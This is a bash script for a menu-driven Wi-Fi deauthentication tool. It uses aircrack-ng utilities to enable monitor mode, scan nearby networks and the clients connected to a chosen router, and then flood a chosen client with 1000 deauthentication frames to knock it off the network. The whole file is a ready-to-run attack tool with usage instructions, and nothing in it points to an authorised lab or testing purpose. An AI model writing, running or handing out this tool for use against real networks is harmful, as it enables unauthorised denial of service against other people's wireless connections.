#!/bin/bash

# Menu-driven Wi-Fi Deauth Tool with Ctrl+C handling
# Change directory to this file in terminal
# chmod +x deauth.sh
# sudo ./deauth.sh

interface=""
monitor_interface=""
bssid=""
channel=""
target_mac=""
interrupted=0

# Trap function for Ctrl+C (SIGINT)
trap_ctrlc() {
    echo -e "\n⚠️  Ctrl+C detected! Returning to menu instead of exiting..."
    interrupted=1
}

pause() {
    read -p "Press Enter to continue..."
}

main_menu() {
    while true; do
        echo ""
        echo "===== Wi-Fi Deauth Menu Tool ====="
        echo "1. Show interfaces (iwconfig)"
        echo "2. Kill conflicting processes"
        echo "3. Start Monitor Mode"
        echo "4. Scan Nearby Networks"
        echo "5. Test AP Injection Support"
        echo "6. Target Specific Router & Scan Clients"
        echo "7. Deauth Specific Client"
        echo "8. Stop Monitor Mode & Restart Network"
        echo "9. Exit"
        echo "==================================="
        read -p "Choose an option: " choice

        case $choice in
            1) iwconfig; pause ;;
            2) airmon-ng check kill; pause ;;
            3) start_monitor ;;
            4) scan_networks ;;
            5) test_ap ;;
            6) scan_clients ;;
            7) deauth_target ;;
            8) stop_monitor ;;
            9) echo "Goodbye!"; break ;;
            *) echo "Invalid option. Try again."; pause ;;
        esac
    done
}

start_monitor() {
    read -p "Enter your wireless interface (e.g., wlan1): " interface
    airmon-ng start $interface
    monitor_interface="${interface}mon"
    echo "Monitor mode started on $monitor_interface"
    pause
}

scan_networks() {
    echo "Scanning for nearby Wi-Fi networks. Press Ctrl+C to stop..."
    sleep 2
    trap trap_ctrlc INT
    interrupted=0
    airodump-ng $monitor_interface
    trap - INT
    [[ $interrupted -eq 1 ]] && pause
}

test_ap() {
    echo "Testing AP injection support on $monitor_interface..."
    trap trap_ctrlc INT
    interrupted=0
    aireplay-ng --test $monitor_interface
    trap - INT
    [[ $interrupted -eq 1 ]] && echo "Injection test was interrupted." && pause
}

scan_clients() {
    read -p "Enter BSSID of target router: " bssid
    read -p "Enter Channel number: " channel
    echo "Scanning for clients connected to $bssid on channel $channel..."
    trap trap_ctrlc INT
    interrupted=0
    airodump-ng --bssid $bssid --channel $channel --write scan $monitor_interface
    trap - INT
    [[ $interrupted -eq 1 ]] && echo "Client scan interrupted." && pause
}

deauth_target() {
    read -p "Enter MAC address of the target client: " target_mac
    echo "Sending deauth packets to $target_mac from AP $bssid..."
    trap trap_ctrlc INT
    interrupted=0
    aireplay-ng --deauth 1000 -a $bssid -c $target_mac $monitor_interface
    trap - INT
    if [[ $interrupted -eq 1 ]]; then
        echo "⚠️ Deauth attack was interrupted."
        read -p "Do you want to restart the network? (y/n): " restart
        if [[ "$restart" == "y" || "$restart" == "Y" ]]; then
            stop_monitor
        fi
    fi
    pause
}

stop_monitor() {
    echo "Stopping monitor mode and restarting network..."
    airmon-ng stop $monitor_interface
    service NetworkManager restart
    echo "✅ Network restored."
    pause
}

main_menu
